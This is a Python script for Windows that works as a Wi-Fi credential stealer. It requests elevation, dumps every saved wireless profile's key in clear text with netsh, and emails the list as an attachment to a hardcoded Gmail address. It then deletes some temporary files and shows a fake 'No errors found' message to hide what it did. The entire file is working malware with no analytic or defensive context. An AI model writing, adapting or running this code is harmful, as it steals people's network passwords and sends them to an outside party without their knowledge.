import os
import smtplib 
import time
import socket
import tkinter
import win32com.shell.shell as shell
from email.message import EmailMessage 
from tkinter import messagebox

def send_to_gmail(file):
    msg = EmailMessage()
    msg['Subject'] = 'Here you go'
    msg['From'] = 'OSINT48@gmail.com'
    msg['To'] = 'OSINT48@gmail.com'
    msg.set_content('LIST OF WIFI PASSWORDS')

    with open(('C:\\Users\\' + os.environ['USERNAME'] + f'\\{file}'), 'rb') as f:
        file_data = f.read()
        file_name = f.name

    msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login('OSINT48@gmail.com', '')
        smtp.send_message(msg)

def main_process():
    try:
        profiles = []
        paswords = []
        pass_files = []
        commands_count = []

        file = open('C:\\Users\\' + os.environ['USERNAME'] + '\\file.txt', 'w')
        path_profile = 'C:\\Users\\' + os.environ['USERNAME'] + '\\profiles.txt'

        shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+ ('netsh wlan show profile > ' + path_profile))
        time.sleep(0.5)
        data = (open('C:\\Users\\' + os.environ['USERNAME'] + '\\profiles.txt', 'r')).read().split('\n')

        for i in data:
            if ':' in i:
                prof = i.split(':')[1]
                if prof != '':
                    profiles.append(prof)

        for i in range(len(profiles)):
            commands_count.append(f'netsh wlan show profile {profiles[i]} key=clear > C:\\Users\\' + os.environ['USERNAME'] + f'\\pass{i}.txt')
            pass_files.append('C:\\Users\\' + os.environ['USERNAME'] + f'\\pass{i}.txt')


        s = '; '    
        shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+ (s.join(commands_count)))
        time.sleep(1)

        for i in range(len(profiles)):
            pass_data = (open(pass_files[i], 'r')).read().split()
            for j in range(len(pass_data)):
                if 'Key' in pass_data[j] and 'Content' in pass_data[j+1]:
                    paswords.append(pass_data[j+3])

        for i in range(len(profiles)):
            file.write(profiles[i] + ' : ' + paswords[i][0] + '\n')
        file.close()

        send_to_gmail('file.txt')

        root = tkinter.Tk()
        root.withdraw()
        messagebox.showinfo('Congratulations', 'No errors found')
        root.destroy()

    except socket.gaierror:
        root = tkinter.Tk()
        root.withdraw()
        messagebox.showerror('Error', 'No internet connection')
        root.destroy()
        os.remove('C:\\Users\\' + os.environ['USERNAME'] + '\\file.txt')
    finally:
        try:
            os.remove('C:\\Users\\' + os.environ['USERNAME'] + '\\profiles.txt')
            # os.remove('C:\\Users\\' + os.environ['USERNAME'] + '\\file.txt')
        except FileNotFoundError:
            pass    

if __name__ == '__main__':
    main_process()